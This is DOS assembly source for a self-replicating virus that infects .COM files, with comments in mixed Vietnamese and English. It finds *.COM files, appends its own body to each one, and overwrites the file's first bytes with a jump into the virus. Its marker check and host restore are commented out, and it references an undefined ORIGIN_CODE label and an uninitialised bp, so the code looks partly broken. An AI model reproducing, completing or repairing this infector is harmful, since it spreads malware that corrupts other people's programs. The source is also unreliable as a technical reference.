.model small
.code    
    ORG 100H  
    
START:  
  jmp near ptr FIND_BEGIN     
  ;db ''
  
VIRUS:       ;virus label   

DATA_ARRAY DB 0,0,0,0,0

FIND_BEGIN:
    call EXECUTE
    
EXECUTE:    
    pop di   
    sub di,offset EXECUTE
    call FIND_FILE
       
FIND_FILE:
    mov ah,4EH
    lea dx,[di+OFFSET COM_FILE]
    int 21H     
FIND_LOOP:
    jc DONE
    mov ax,3D02H 
    mov dx,9EH
    int 21H 
    mov bx,ax            ; put file handle vao bx    
    
;CHECK_FILE:              ; check 5 byte cua virus (virus's marker)
;    mov ah,3FH
;    mov cx,3
;    int 21h 
;    jc  short CLOSE_FILE ; file da infected, move to next file.
    
    xor cx,cx
    xor dx,dx            ; cx:dx=0
    mov ax,4202H         ; ah=42H,   al= {0:beginning;2:end of file;1:present location}
    int 21H              ; move to end of file
    
    mov cx, OFFSET ENDVIR - OFFSET VIRUS    ; so luong byte can write
    lea dx,[di+VIRUS]                       ; bat dau tu label virus
    mov ah,40H
    int 21H    
    jc  short CLOSE_FILE     
    
    xor cx,cx
    mov dx,[bp+1AH]
    add dx,offset ORIGIN_CODE - offset VIRUS
    mov ax,4200H
    int 21H                                 ; move pointer ve dau file
    
    mov cx,5                ; write 5 bytes at the beginning (origin host)
    lea dx,[di+DATA_ARRAY]  ; bat dau tu data_array
    mov ah,40H              ; write sau code virus
    int 21H
    
    
    xor cx,cx
    xor dx,dx
    mov ax,4200H
    int 21H              ; move back ve dau host, dat lenh jmp
    
    mov byte ptr [di+DATA_ARRAY],0E9H    ; set 3 byte dau tien la lenh jmp(co opcode 0E9H)  
    mov ax,[bp+1AH]
    add ax,offset FIND_BEGIN - offset VIRUS -3
    mov word ptr [di+DATA_ARRAY+1],ax
    mov word ptr [di+DATA_ARRAY+3],4956H
    
;    mov cx,5                      ; set 5 bytes ghi vo host
;    lea dx,[di+DATA_ARRAY]        ; tai vi tri data_array
;    mov ah,40H
;    int 21H                       ; ghi
    
CLOSE_FILE:    
    mov ah,3EH      
    int 21H         ;close file
    mov ah,4FH      
    int 21H         ;search for next file
    jmp FIND_LOOP  
         
DONE:
;    mov ah,1AH                      ; restore DTA
;    mov dx,80H
;    int 21H
;    mov si,offset START             ; restore 
;    push si
;    lea si,[bp+TERMINATE]
;    movsw
;    movsw
;    movsb     
    ret                             ; tra lai access cho host
        
    
COM_FILE    DB      '*.COM',0      
TERMINATE   DB 0B8H,00H,4CH,0CDH,21H  ;0CDH : release file set,4CH: exit,

        
ENDVIR:  

END START
